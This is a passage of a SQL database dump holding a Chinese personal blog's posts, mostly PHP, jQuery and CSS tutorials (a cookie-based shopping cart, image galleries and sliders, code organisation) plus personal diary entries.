standair@yahoo.com.cn，或者在paperen网站上留个言或者习科论坛上发表疑问，也许在后续会写一个安装程序，免大家这么麻烦。<br /><br />将自己的博客开源的目的其实很简单，希望这个代码能被大家不断改善从而更加强大。喜欢跟大家分享东西，而这次就分享自己做的东西，希望大家喜欢吧~~也希望大家一起完善吧~~<br /></p><p><a href="http://iamlze.cn/download/paperenblog.rar" target="_blank">下载地址</a></p><p>2011/2/11 补充，多谢yf兄使用了paperen的博客程序并写了一篇安装说明，paperen很感动~~之前一直没写出个安装，看来paperen要腾出时间弄弄才行，还有一些小bug也要修复一下。下面为yf兄写的说明地址。</p><p><a href="http://www.drvfan.com/archive/PaperenBlog安装使用详细参考文档" target="_blank">http://www.drvfan.com/archive/PaperenBlog安装使用详细参考文档</a></p><p>2011/2/12 更新</p><p>1.修复后台操作成功时显示success.png图片问题（admin/templates/uploadpic.tpl.php，addpost.tpl.php，modpost.tpl.php，blog.tpl.php）</p><p>2.加入文章与图片删除功能（admin/modules/uploadpic.mod.php 与 blog.mod.php，admin/templates/uploadpic.tpl.php，blog.tpl.php）</p><p>3.重定向函数之前使用ob_end_clean （include/func.php）</p><p>2011/2/16 更新</p><p>1.添加文章URL标题</p><p>2.后台登陆界面修改</p></p>', 2, 1, 1801, 4, 0, 0, 1279846770, 0),
(31, '实现购物车功能', 'cart', 2, '<P>原来懒吧的空间也支持php的，那行啦，干脆用php写算了，asp我都不会了……写几行就有错而且用惯了php后用asp特不顺手，php对变量的定义太宽松，回到asp里面却觉得不习惯。昨天晚上试弄了一下个购物车功能，这里也写出来分享一下吧，顺便也更新一下博客…… </p>\r\n<P>例子地址<A href="http://iamlze.cn/demo/cart/ ">http://iamlze.cn/demo/cart/ </A></p>\r\n<P>购物车的实现说到底就是在使用一些超级变量，你可以使用cookie或者session来做你的购物车，就是存储你的临时购物记录，当然你还可以使用数据库进行记录，方法就三种，自己随便挑一种适合自己使用的就可以了，而paperen这里使用了cookie进行记录。 </p><!--more-->\r\n<P>至于数据结构嘛，因为每种商品具有各自的ID号（唯一的），而也因为你可以在同一时间将不同数量商品放到购物车中，所以使用数组来作为数据结构就行了，$cart[''商品ID号'']=商品数量。 </p>\r\n<P>最后就是php中操作cookie的方法，使用setcookie来对cookie进行初始化与赋值的操作，详细参数介绍请看php手册</p><P><A href="http://docs.php.net/manual/en/function.setcookie.php">http://docs.php.net/manual/en/function.setcookie.php</A></p><P>而对于清除某个cookie也是使用该函数进行的，一般来说将某个cookie赋予空值就相当于是删除了，或者将其生命期限调到现在。至于具体操作下文再说。 </p>\r\n<P>下面开始动手，先整个稍微像样的页面吧，放出一些虚假的商品</p>\r\n<P><a href="http://localhost/paperenblog/file/46" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/46" alt="201001261264497266" title="上传于2010-01-26"></a></p>\r\n<P>因为这里自己只是进行试验，所以就不用整得那么花哨了，而那个BUY ME就是一个链接，地址中加参数?do=add&amp;id=ID号，当然你可以交给另一个页面处理，或者使用ajax，但是核心代码都是一样的，只是表现形式不同而已。 </p>\r\n<P>如果你点击了某个商品的BUY ME，就会向再次请求页面并在URL中加上两个参数，do=add与id号，然后就让程序判断是否存在do参数，根据do参数的值分别进行相应的操作，例如do为add的时候。 </p><PRE>switch ($do){<br />   case "add":<br />    $id=isset($_GET[''id'']) ? intval($_GET[''id'']) : '''';<br />    //相应操作<br />   break;<br />   case "less":<br />    $id=isset($_GET[''id'']) ? intval($_GET[''id'']) : '''';<br />    //相应操作<br />   break;<br />   case "clear":<br />    //相应操作<br />   break;<br />   default://异常<br />  } </PRE><P>使用switch语句对不同参数进行不同的操作，paperen觉得这就相当于指挥系统吧，之后再获得id号，而且要对id号进行过滤，使用intval函数可以将不是数字的变量转变为0，而如果是数字的话就原样返回，包括负数。之后就是对cookie的赋值，setcookie("buy[$id]",1,time()+24*60*60);但是在这个地方得要注意。 </p>\r\n<P>1.判断id号是不是正确，这里正确的意思不代表上面对id获取时候的正常情况，而是说要确保数据可靠性（数据表中是否真的存在该id号的数据），你得去判断如果没有要马上终止后续的操作。</p>\r\n<P>2.判断cookie中该键值的数据是否存在，也就是说$_COOKIE[''buy''][$id]是否存在，如果是空的应该初始值为1，如果非空在其基础上加1。对于购物车这种功能paperen觉得真的要很小心地进行程序编写，你要考虑程序的可靠性，还有参数的正确性，虽然不是每个人都会故意去做一些小动作，但是你总得要考虑到某些人会修改cookie或者修改一些BT的URL参数进行所谓的挑刺行为。 </p><PRE>if(isset($_COOKIE[''buy''][$id]) &amp;&amp; intval($_COOKIE[''buy''][$id])){<br />     setcookie("buy[$id]",intval($_COOKIE[''buy''][$id])+1,time()+24*60*60);<br />    }else{<br />     setcookie("buy[$id]",1,time()+24*60*60);<br />    }</PRE><P>对于减少商品的操作与添加类似，只是-1而已，而清除购物车中所有的商品正如上面说的，将buy数组中设置各个键的值为空就可以了。 </p><PRE>foreach($_COOKIE[''buy''] as $k=&gt;$value){<br />    setcookie("buy[$k]",'''');<br />   }</PRE><P>而对于显示当前购物金额与物品那，你再抽取cookie并将每个id号查回数据表便可以获得该商品的相应信息了。 </p>\r\n<P>而之后自己又用了一个类来操作，好像写得也不咋的……也给大家看看吧。 </p><PRE> define(''E_TIME'',5*60);//5分钟的生命<br /> class Cart<br /> {<br />  function add($id){<br />   if(empty($id)){<br />    return false;<br />   }<br />   if(isset($_COOKIE[''buy''][$id]) &amp;&amp; intval($_COOKIE[''buy''][$id])){<br />    setcookie("buy[$id]",$_COOKIE[''buy''][$id]+1,time()+E_TIME);<br />   }else{<br />    setcookie("buy[$id]",1,time()+E_TIME);<br />   }<br />  }<br />  function less($id){<br />   if(empty($id)){<br />    return false;<br />   }<br />   if(isset($_COOKIE[''buy''][$id]) &amp;&amp; intval($_COOKIE[''buy''][$id])&gt;1){<br />    setcookie("buy[$id]",$_COOKIE[''buy''][$id]-1,time()+E_TIME);<br />   }else{<br />    setcookie("buy[$id]",'''');<br />   }<br />  }<br />  function clear(){<br />   foreach($_COOKIE[''buy''] as $k=&gt;$value){<br />    setcookie("buy[$k]",'''');<br />   }<br />  }<br /> }<br />?&gt;</PRE><P>自己在这个试验中并没有调用数据库，而是使用一个数组作为数据，在data文件中。</p></p>', 2, 1, 999, 0, 0, 0, 1264502375, 0),
(32, 'paperen的近况', 'paperen-recent', 4, '<P>貌似好几天都没更新博客了，paperen在忙帮吴同学弄他们家公司的一个管理系统啊，说容易也不容易，说困难也不困难，而且吴同学的要求也是很高的。感觉paperen现在使用ajax有点泛滥了，不过自己确实喜欢使用它，不用每次操作都要提交数据导致刷新页面，不过各人有各人爱好吧，使用ajax反而增加了js文件的大小，还有需要注重js函数的重用性，paperen认为一个出色的程序员也是一个很懒的人才对的。 </p>\r\n<P>昨晚换了个博客主图片，paperen自己画的啊，感觉还行吧，好像花了差不多两个小时吧，本身还打算上色的，不过都已经凌晨1点了……还是算了吧，但爸爸没睡呢，还在厅的台式电脑前……好像还在玩那个幻幻球游戏（我传给我细佬玩的）。这张新的图片就算是这几天一个比较大的更新吧。 </p>\r\n<P>看到自己的博客慢慢地被搜索引擎收录了，而且今天自己在搜索“paperen博客”时也看到一些网站把自己的某些文章抄去了，看来自己的某些文章还是有人认同滴，但是他们为什么不告诉我一声呢……</p><!--more--></p>', 2, 1, 1232, 0, 0, 0, 1264832862, 0),
(33, '我是怎样编写网站代码的', 'how-to-code', 2, '<P>又是一个以自己为钻研目标的话题，可能你会有更好的办法（例如使用框架开发）欢迎交流，而我这里也只是与大家分享一下自己的做法。 </p>\r\n<P>初期：庞大而独立的风格。 </p>\r\n<P>记得那时paperen我从asp过来php的时候，都是将一大堆的php代码写在一个文件中，夹杂着html与php代码，而且每个文件的独立性很强，它们彼此间缺少分享精神，它们都是很自私，除了那个连接数据库的文件外，因为那时我就是在每个文件头部require("db.php");这样做的，而且还没分块来实现，就是说整个页面的html都是复制过去另一个页面里面，变的可能只是php代码与一些模块内容。</p><!--more-->\r\n<P><a href="http://localhost/paperenblog/file/47" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/47" alt="201002011265037790" title="上传于2010-02-01"></a> </p>\r\n<P>或者说这种模式比较适合初上手php的，当然这种编写代码的方式有自己的优点： </p>\r\n<P>1.你不用到处寻找代码，调试与挑错都比较好办，因为每个文件之间都是独立的，这个文件出错了你只针对其进行检查好了</p>\r\n<P>2.一眼可以看透文件的思路与做法，只要你能将整个文件的内容看完就基本能明白其编写思路 </p>\r\n<P>但是这种编写代码方式有着很致命的缺憾，就是重用性太低了，每写一个文件你都得要重写甚至复制原来的html代码与某些php代码，如果假设我要改导航栏或者脚部一些文字，你得要打开全部文件然后逐个改，很好，即使你很有耐心但是这确实不是一种值得推荐的编写代码的方法。 </p>\r\n<P>初中期：大头型 </p>\r\n<P>之后paperen我算是有点进步，不过对比于初期没太大的改观……</p>\r\n<P><a href="http://localhost/paperenblog/file/48" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/48" alt="201002011265039169" title="上传于2010-02-01"></a> </p>\r\n<P>将一些页面的共同元素提出来作为共享文件引用，添加了一个公共函数库文件，优点相对于初期那种做法是明显的。 </p>\r\n<P>1.对于修改页面中共同的部分时（head.php与foot.php文件）你只需要到相应文件修改即可，修改后所有页面都会更改而不至于像初期那样每个文件都得修改一次。</p>\r\n<P>2.引入了公共函数库文件，一些常用功能可以封装成单独的函数，稍微增强了代码的重用性。 </p>\r\n<P>但是看看，文件的头部还是存在不少的php代码，大头的现象，其实仔细想想这部分的功能就相当于文件的控制器，它可能用于接收表单的数据与分析数据并对不同参数进行不同的动作并会影响到页面内容的变化。那是不是可以将头部提取出来呢？将控制部分与html部分分开。 </p>\r\n<P>中期：有点分层次的味道</p>\r\n<P><a href="http://localhost/paperenblog/file/49" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/49" alt="201002021265040112" title="上传于2010-02-02"></a></p>\r\n<P>将每个页html部分提取出来放到一个文件（任何格式都是可以的）中，然后为每个页建立一个php页，这个php文件就相当于控制器了，头部的代码完全可以放在这里，然后再去决定调用哪个模块文件。原来的一个文件（php）现在要分成两个文件（模块文件与控制文件）。 </p>\r\n<P>优点：</p>\r\n<P>1.很明显这样做是更加合理而且更加有利于站点的组建，控制代码与html貌似是分离开了。</p>\r\n<P>2.自己想吧……paperen我实在是想不出了…… </p>\r\n<P>现在：统一的入口都是以index页为动作的驱动，根据参数决定目前浏览者的动作并根据其动作作出相应的相应，比如你要访问test页，那么传参数给index页,index.php?p=test然后根据该动作引入test.php控制文件，（判断是否存在此控制文件与判断一些参数的正确性也很重要的，不可忽视的地方）通过一些动作或者与数据库交互后再读入相应模块文件(head.tpl,test.tpl,foot.tpl等文件)。 </p>\r\n<P><a href="http://localhost/paperenblog/file/50" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/50" alt="201002021265041477" title="上传于2010-02-02"></a> </p>\r\n<P>你还需要define一些常量，因为这样会十分方便你在后续的编码。 </p>\r\n<P><a href="http://localhost/paperenblog/file/51" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/51" alt="201002021265041760" title="上传于2010-02-02"></a> </p>\r\n<P>目前paperen我都是这样进行网站的代码编写的，当然貌似还有更不错的方法可以使你更快捷地建立网站，就是使用传说中的框架进行开发，不过paperen我目前还是不太熟悉，所以暂时不举例子。 </p>\r\n<P>其实对与上面说tpl文件（paperen所形容的模块文件）并不是说没有任何php代码，其实也是由html与php代码夹杂着的。 </p>\r\n<P><a href="http://localhost/paperenblog/file/52" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/52" alt="201002021265042091" title="上传于2010-02-02"></a> </p>\r\n<P>其实paperen这样也并没有真正上实现了php与html的分离，当然你可以使用smarty或者像phpcms那样使用一些正则替换来实现所谓的php与html分离的功能。其实paperen我也不清楚自己这样编码究竟算不算是MVC模式呢？（模板，视图，控制）或许有些少味道吧……</p></p>', 2, 1, 1350, 0, 0, 0, 1265042414, 0),
(34, '很早之前偷的图片转换效果js', 'stealing-js-picshow', 3, '<P>这个今天刚记起所以就放出来分享一下，是很前一段时间paperen为了帮小王所以扒下来的，还没看它的js代码，其实paperen不是很经常偷别人的东西啦，就是偶尔有时候为了帮忙或者实在觉得效果不错就下手咯……那也是理所当然的事情嘛，大家说是吧？ </p>\r\n<P>不多说demo地址在这里 <A href="http://iamlze.cn/demo/picrun/">http://iamlze.cn/demo/picrun/</A></p>\r\n<P>自己看看吧，喜欢的话拿去吧（查看源代码，拿css文件与js文件就行啦，paperen我已经将css文件做缩减了，不过js文件还没整理好，大家将就吧……有谁整理好的也可以发我一个）</p><!--more--></p>', 2, 1, 1243, 0, 0, 0, 1265044563, 0),
(49, '一个图片展览的效果', 'js-pic-exhibition', 3, '<p>越来越觉得在网站开发中，前端的效果最不能忽视，包括用户体验与交互效果，当然还有CSS等等，刚看完了一本叫《Don''t make me think》的书，说的是关于WEB用户体验等方面的东西，我们如何选择首页的说明文字，如何让浏览者不会在你的网站中迷失，如何让浏览者迅速了解你的网站，原来都是很有学问的~~总之也不简单，慢慢领会吧。</p><p>paperen也很久没发东西了，趁着有空，做了个图片展览的东西，还勉强过得去吧。</p><p><a href="http://localhost/paperenblog/file/53" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/53" alt="20100708005248" title="上传于2010-07-08"></a></p><!--more--><p>Demo地址：<a href="http://iamlze.cn/demo/image-thumb/">http://iamlze.cn/demo/image-thumb/</a></p><p>这个效果其实很多见了，一般在一些购物网上都会有这种效果，难度也不大，使用jquery真的很方便就能实现很多cool的效果。例如这个就是</p><p><a href="http://localhost/paperenblog/file/54" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/54" alt="20100708003531" title="上传于2010-07-08"></a></p><p>其实对于paperen弄的那个，实现起来很简单，不过还是给大家说说吧。</p><p>1.引入jquery引擎是必须的</p><pre>&lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js"&gt;&lt;/script&gt;</pre><p>2.打造html结构</p><pre>&lt;div class="img_show"&gt;<br />	&lt;h5&gt;图片展览&lt;small&gt;[Paperen]&lt;/small&gt;&lt;/h5&gt;<br />	&lt;div id="img_big" class="bigone"&gt;<br />    	&lt;a href="11559c21572.jpg" target="_blank" class="magnifier" alt="view big image" title="查看大图"&gt;&lt;/a&gt;<br />    	&lt;img src="images/11559c21572.jpg" alt="Image Thumb" title="Image Thumb" /&gt;<br />    &lt;/div&gt;<br />    <br />    &lt;ul class="img_thumb"&gt;<br />    	&lt;li&gt;&lt;a href="javascript:void(0);"&gt;&lt;img src="images/11559c21572.jpg" data="images/11559c21572.jpg" alt="image_1" title="image_1" /&gt;&lt;/a&gt;&lt;/li&gt;<br />    &lt;/ul&gt;<br />    <br />    &lt;div class="c"&gt;&lt;/div&gt;<br />&lt;/div&gt;<br /></pre><p>3.Css登场</p><pre>ul,li{list-style:none;}<br />.c{clear:both;}<br />.img_show{margin:25px auto;width:265px;height:auto;padding:10px;background:#F7F7F7;position:relative;overflow:hidden;outline: 1px solid #ddd;border-top:1px #FFF solid;}<br />.img_show h5{border-bottom:1px #DDD solid;padding:0px 0px 5px 0px;margin:0px 0px 10px 0px;}<br />.img_show h5 small{font-size:11px;color:#CCC;font-weight:normal;padding:0px 0px 0px 5px;}<br />.img_show .bigone{margin:0px auto 15px auto;width:130px;position:relative;}<br />.img_show .bigone img{padding:5px;border:1px #DDD solid;background:#FFF;}<br />.img_show .bigone .magnifier{display:block;width:16px;height:16px;background:url(images/magnifier.png) no-repeat;position:absolute;top:5px;left:5px;}<br />.img_thumb li{float:left;margin:0px 3px 3px 3px;}<br />.img_thumb li a{display:block;border:1px #CCC solid;padding:2px;}<br />.img_thumb li a:hover{background:#FFF;border:1px #999 solid;}<br />.img_thumb li img{width:54px;height:54px;}<br /></pre><p>4.使用js衔接一切</p><pre>$(document).ready(function(){<br />	$(".img_thumb img").fadeTo(''fast'', 0.5);//初始化所有小图片的透明度<br />	fadeToEffect(".img_thumb img");//为所有小图添加上交互事件<br />	$(".img_thumb img").click(function(){//定义点击小图触发的动作<br />		var next_img = $(this).attr(''data'');<br />		go_next_img(next_img);<br />	});<br />});<br />//定义小图鼠标交互效果,使用fadeTo来调节透明度<br />function fadeToEffect(obj){<br />	$(obj).mouseover(function(){<br />		$(this).fadeTo(''normal'', 1);<br />	});<br />	$(obj).mouseout(function(){<br />		$(this).fadeTo(''fast'', 0.5);<br />	});<br />}<br />//大图片的切换<br />function go_next_img(imgurl){<br />	$(".magnifier").hide("fast", function(){<br />		$(this).attr("href", imgurl);<br />	});<br />	$("#img_big img").fadeTo(''normal'', 0, function(){<br />		$("#img_big img").attr(''src'', imgurl).fadeTo(''normal'', 1, function(){<br />			$(".magnifier").show();<br />		});<br />	});<br />}</pre><p>jquery确实很好，paperen其实根本没有踏实地学过JavaScript的~~而是直接转入到jquery来~~所以现在再回头看JavaScript的书。因为感觉这样有点虚……</p><p>而对于jquery可以到这个网站下载手册或者在线查阅相关资料：<a href="http://jquery-api-zh-cn.googlecode.com/svn/trunk/index.html">http://jquery-api-zh-cn.googlecode.com/svn/trunk/index.html</a>。</p><p>而最后想谈谈关于网站商品图片的东西，正如上面那个相机截图那样，底部有五张小图，每点击其小图，大图也会跟着产生切换，在实现上当然完全可以使用一张图片实现，使用css对大图的大小进行压缩的办法来实现小图，或许有些少web开发经验的人都会使用这种办法，但是paperen觉得这种办法确实不治本，因为大图的清晰度确定要高固然文件大小也会大，一张至少几百KB，而如果使用Css对图片进行长高的压缩，其实是没有改变图片的大小，而这样的话就会影响页面加载速度，特别是对于首页而言（因为需要显示很多商品）。<br /></p><p><a href="http://localhost/paperenblog/file/55" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/55" alt="20100708012450" title="上传于2010-07-08"></a></p><p>paperen那个例子中自己可以看看，右击大图看属性与右击该小图看属性，其大小是一样的，paperen这里也没有使用到真正意义上的缩略图。</p><p>当然在图片不多数据量不大的页面上或许还看不出速度上的影响，但是在数据量综合的页面就能明显感觉出来了，比如网上商场首页商品列表。这种问题在开发的时候还是值得注意的。</p></p>', 2, 1, 1205, 2, 0, 0, 1278523953, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(35, '近来关于css的不正常思想', 'some-crazy-about-css', 3, '<P>paperen最近在设计某人的砂场销售系统页面的时候，突然在对css的命名有了点想法，比如对某个元素你可以使用id或者class来对它的css进行编写。前者的区别与后者的区别是明显的，同一个页面中id号是唯一的，也就是说不能有两个或以上的id名字在同一个页面出现，而class则相反，你可以在一个页面中使用同一个class对不同元素进行美化，而且可以套用多个class。类似下面这样写。 </p><PRE>#useid{font-size:12px;}<br />.useclass{border:1px #CCCCCC solid;}<br />.bigfont{font-size:14px;}<br />&lt;/style&gt;<br />&lt;div id="useid"&gt;记住ID号唯一&lt;/div&gt;<br />&lt;div class="useclass"&gt;而使用class则不同&lt;/div&gt;<br />&lt;div class="useclass bigfont"&gt;而使用class则不同&lt;/div&gt;<br /></PRE><P>这些是写css的基本准则了，可能大家对多个class一起套用的方法用得不多吧，paperen我也是在学做WordPress的模板时发现可以这样用的（可能是以前看书不够仔细吧……） </p>\r\n<P>那么如果要写写paperen右边的边栏的css应该怎样写呢？ </p><!--more-->\r\n<P>如果你喜欢使用id的话，你可能会这样：<br /></p><PRE>&lt;style&gt;<br />#sidebar{}<br />#sidebar #motto,#sidebar #lastpost{}<br />#sidebar #motto h5,#sidebar #lastpost h5{}<br />#sidebar #motto p,#sidebar #lastpost p{}<br />#sidebar #motto li,#sidebar #lastpost li{}<br />&lt;/style&gt;<br />&lt;div id="sidebar"&gt;<br /> &lt;div id="motto"&gt;<br />  &lt;h5&gt;心情&lt;/h5&gt;<br />  &lt;p&gt;做自己喜欢的事并喜欢自己所做的事&lt;/p&gt;<br /> &lt;/div&gt;<br /> &lt;div id="lastpost"&gt;<br />  &lt;h5&gt;最新无聊文章&lt;/h5&gt;<br />  &lt;ul&gt;<br />   &lt;li&gt;&lt;a href="#"&gt;看了别后悔&lt;/a&gt;&lt;/li&gt;<br />   &lt;li&gt;&lt;a href="#"&gt;今天下了好多雨&lt;/a&gt;&lt;/li&gt;<br />  &lt;/ul&gt;<br /> &lt;/div&gt;<br />&lt;/div&gt;<br /></PRE><P>对于有没有必要用一个div包住不同的sidebar中的各部分内容，这个自己想吧，paperen我自己也不好说，而很明显随着sidebar里面的内容丰富（这里就写到最新文章那），css的这部分也会越来越长 </p><PRE>#sidebar #motto,#sidebar #lastpost{}<br />#sidebar #motto h5,#sidebar #lastpost h5{}<br />#sidebar #motto p,#sidebar #lastpost p{}<br />#sidebar #motto li,#sidebar #lastpost li{}</PRE><P>故这样看上去会觉得比较的混乱，但是这样的css写法对微调是相对方便点，因为你可以对每个sidebar中的内容进行微调。比如如果我想对新文章那个标题加背景，你就在上面这些css后面加上#sidebar #lastpost h5{background:#CCCCCC;}就能使新文章那产生有别于其他版块的效果。对这样的css再稍微简化一下。</p><PRE>&lt;style&gt;<br />#sidebar{}<br />(一个tab的空白距离)#motto,#lastpost{}<br /> #motto h5,#lastpost h5{}<br /> #motto p,#lastpost p{}<br /> #motto li,#lastpost li{}<br />&lt;/style&gt;<br /></PRE><P>省去了前缀#sidebar，而对css写法也使用缩进的写法，paperen我也是在一次偶然的机会下看到的，忘了是哪个网站还是哪个模板的css代码写法了，这种写法体现层级关系，与html的写法类似，这样写也有理由，因为你可以从css就看出html中元素的嵌套关系。谁在外面谁在里面。 </p>\r\n<P>如果对于喜欢使用class的话，可能会这样写。</p><PRE>&lt;style&gt;<br />.sidebar{}<br />.sidebar_box{}<br />.sidebar_box h5{}<br />.sidebar_box p{}<br />.sidebar_box li{}<br />&lt;/style&gt;<br /><br />&lt;div class="sidebar"&gt;<br /> &lt;div class="sidebar_box"&gt;<br />  &lt;h5&gt;心情&lt;/h5&gt;<br />  &lt;p&gt;做自己喜欢的事并喜欢自己所做的事&lt;/p&gt;<br /> &lt;/div&gt;<br /> &lt;div class="sidebar_box"&gt;<br />  &lt;h5&gt;最新无聊文章&lt;/h5&gt;<br />  &lt;ul&gt;<br />   &lt;li&gt;&lt;a href="#"&gt;看了别后悔&lt;/a&gt;&lt;/li&gt;<br />   &lt;li&gt;&lt;a href="#"&gt;今天下了好多雨&lt;/a&gt;&lt;/li&gt;<br />  &lt;/ul&gt;<br /> &lt;/div&gt;<br />&lt;/div&gt;<br /></PRE><P>很明显地觉得这样的代码比使用id的css写出来的代码看起来舒服，简洁，但是这样的话微调的能力不高，如果确实需要微调的话，需要附加上id号。例如如果要对新文章的标题加背景的话，需要给&lt;DIV class="sidebar_box"&gt;加上id="last_post"然后再写.sidebar_box#last_post h5{background:#CCCCCC;}，需要扩展一下html元素吧（paperen尚且这样形容--扩展html元素就是添加上一个id号啦，实在不知道专业术语应该怎说了）。而这里的css写法paperen觉得就没必要写成有嵌套关系的了吧。 \r\n<P>而paperen自己是推荐大体使用class的方法再配合使用id对局部地方进行微调的css写法，因为这个很好理解，使用class对需要一样渲染效果的html元素进行渲染，然后使用id对局部特殊的元素进行另类的渲染，听上去确实也是很美好的。 </p>\r\n<P>而如果我要心情那的标题加背景，新文章那标题加下边框，新评论那个的字体加黑，被踩得火热的文章那个文字颜色不一样，随机来一篇文章那的边距与其他的不一样……当每个元素的个性化比较突出时，使用上面这样的写法也是避免不了css的混乱。.sidebar_box#last_post h5类似这种的css会比较多，不过这个确实是不可避免的了，因为你确实觉得这样是最好的方法了。 </p>\r\n<P>不过近来paperen有了一个可怕的念头……就是使用N多个class……希望大家不要见笑。 </p>\r\n<P>如果我将一些基本的效果单独出来再来渲染一个html元素。</p><P><PRE>&lt;style&gt;<br />.float_left{float:left;}<br />.float_right{float:right;}<br />.stress{font-weight:bold;}<br />.border_bottom{border:1px #CCCCCC solid;}<br />.red{color:#FF0000;}<br />.padding_3{padding:3px;}<br />.margin_5{margin:5px;}<br />.margin_5_auto{margin:5px auto;}<br />.width950{width:950px;}<br />&lt;/style&gt;<br />&lt;div class="float_left stress border_bottom padding_3 red margin_5_auto width950"&gt;是不是比较BT的想法&lt;/div&gt;<br /></PRE><P>那么你觉得这个做法怎样？还是令css很混乱？还是更差？想想，希望你能说出你的想法然后分享一下。当然paperen我不会提供你关于css的最好的写法，因为我自己都不是很能领悟什么是最好的css写法与怎样使用最简的html完成一些页面，这里paperen我只是说出自己对于css的一些想法而已。</p></p>', 2, 1, 850, 0, 0, 0, 1265552800, 0),
(36, 'JQuery滑动图片', 'jquery-pic-slide', 3, '<P>paperen以前弄的那个图片转换太失败了，有看代码的会发现是更换了img的src值来改变图片，而html代码中也只有一张图片（&lt;IMG src="i.jpg" ?="" /&gt;），而这样的缺点就是要等待图片完全下载完才能切换出来，明显的表现是在网速不理想下点击切换按钮时不能马上转换图片而是要等待一定时间。所以paperen我觉得还是要在html中先所有图片都放出来然后用css隐藏一部分图片来制造这种效果是最理想的，其实这个方法也不是我想出来的，你随便找个有js滑动图片的网站看源代码都是将所有图片事先放出来的，因为这样会先下载图片，即使你只能看到一张图片。</p>\r\n<P><A href="http://iamlze.cn/demo/imageslider/">http://iamlze.cn/demo/imageslider/</A></p>\r\n<P>1.HTML结构<br /></p><!--more--><P><PRE>&lt;div class="container"&gt;<br />  &lt;div class="imgbox"&gt;<br />   &lt;div class="imgshowbox"&gt;<br />    &lt;img src="1.png" id="img_1" title="" alt="" /&gt;<br />    &lt;img src="2.png" id="img_2" title="" alt="" /&gt;<br />    &lt;img src="3.png" id="img_3" title="" alt="" /&gt;<br />    &lt;img src="4.png" id="img_4" title="" alt="" /&gt;<br />   &lt;/div&gt;<br />  &lt;/div&gt;<br />  &lt;div class="c"&gt;&lt;/div&gt;<br />  &lt;ul class="imgnav"&gt;<br />   &lt;li&gt;&lt;a href="#" class="active" rel="1"&gt;&lt;/a&gt;&lt;/li&gt;<br />   &lt;li&gt;&lt;a href="#" rel="2"&gt;&lt;/a&gt;&lt;/li&gt;<br />   &lt;li&gt;&lt;a href="#" rel="3"&gt;&lt;/a&gt;&lt;/li&gt;<br />   &lt;li&gt;&lt;a href="#" rel="4"&gt;&lt;/a&gt;&lt;/li&gt;<br />  &lt;/ul&gt;<br /> &lt;/div&gt;<br /></PRE><P></p><P>2.CSS</p><PRE>*{margin:0px;padding:0px;}<br />body{font-family:Verdana, Arial, Helvetica, sans-serif;font-size:14px;}<br />.container{}<br />.c{clear:both;}<br />ul,li{list-style:none;}<br />a{text-decoration:none;color:#666666;}<br />.imgbox{width:900px;height:300px;overflow:hidden;position:relative;}<br />.imgshowbox{position:absolute;top:0;left:0;width:3600px;}<br />.imgshowbox img{float:left;}<br />.imgnav{float:left;}<br />.imgnav li{float:left;margin:5px;list-style:none;}<br />.imgnav li a{background:url(btn.jpg) no-repeat;width:12px;height:12px;display:block;}<br />.imgnav li a.active{background-position:-12px 0px;}</PRE><P>imgbox的超出部分设为隐藏并为相对，这样的话就会隐藏里面对齐方式是绝对的imgshowbox超出来的图片。</p>\r\n<P>3.引入jquery框架文件</p><P>&lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js"&gt;&lt;/script&gt;</p><P>4.完成动作与效果</p><PRE>$(document).ready(function(){<br />  $(".imgnav a").click(function(){<br />    var num=($(this).attr(''rel'')-1)*(-900);<br />    $(".imgshowbox").animate({left:num},500);<br />    $(".imgnav a").removeClass(''active'');<br />    $(this).addClass("active");<br />  });<br />});<br /></PRE><P>如果对比一下paperen前几天那篇《很早之前偷的图片转换效果js》中的那个js代码而言这里做出来的效果与那个效果相差无几，但是对比一下代码你会发觉哪一个的代码更加有优势。这里paperen我没有将效果做全，定时切换的效果留给你自己去做吧，自己动手丰衣足食嘛，不要那么懒，还有我还没有给图片加上超链接自己可以根据自己需要修改一下，毕竟也不难懂，而且我相信还可以将这个效果封装得更完美，比如css中imgshowbox的宽度3600px，你完全可以用js先获取第一张图片的宽度然后才改变这个3600px的值，而不是写死在css中，这样的话当图片不是900px宽时就又得改css了，很明显这里自己封装得太垃圾了，灵活性不够强大，不过这个光荣的任务就交给你吧，弄好了也发一份我看看吧。</p></p>', 2, 1, 1251, 0, 0, 0, 1265904945, 0),
(37, '年三十杂文一篇', 'essays', 1, '<P>今天差不多十一点才起床，还是冷点睡得舒服，家这边的天气确实也挺离谱的，前几天是夏天而过了一夜就成冬天，不过老实说paperen我还是喜欢冬天，不知不觉又到了新年，自己还没去找工作呢，前段时期的任务还没有完成，感觉这段时光是在真正的休息似的，专科的朋友们都已经上岗位半年了，而自己现在就要面临找工作了，看他们的工资也不低，不知不觉间又问了一句“其实读专科与读本科有什么区别呢……”，又仿佛觉得中国的教育实在不是那么的靠谱。 </p>\r\n<P>当然啦，看到别人在努力为了未来奋斗的时候也会提醒自己要做些东西，不过那种感觉很怪，你看到他们有工作了，又觉得自己也应该要有份工作，因为好像大家都认为读完四年的最好而且最光荣的成就就是能找一份工资高的工作，而paperen的一些朋友甚至是老师也一直很看好我，说我一定一定要找份很好的工作，要成为怎么样……我也搞不清那是给我的支持还是压力，而妈妈前段时间也不停在拉关系，paperen我也跟她说很多次我不想靠她所谓的人际关系去获得所谓高薪而且高福利的工作，但是我也没给她表明我能找到一份什么样的工作，而paperen觉得自己也是一名死干活的，当不了干部当不了管理，或许那也是宿命，爷爷，爸爸都是那样的人，不过我一直以他们为榜样，我觉得自己就是应该当那样的人，虽然妈妈说我们是不思进取，但是我还是觉得追求自己的理想与兴趣是很令人幸福的事情。 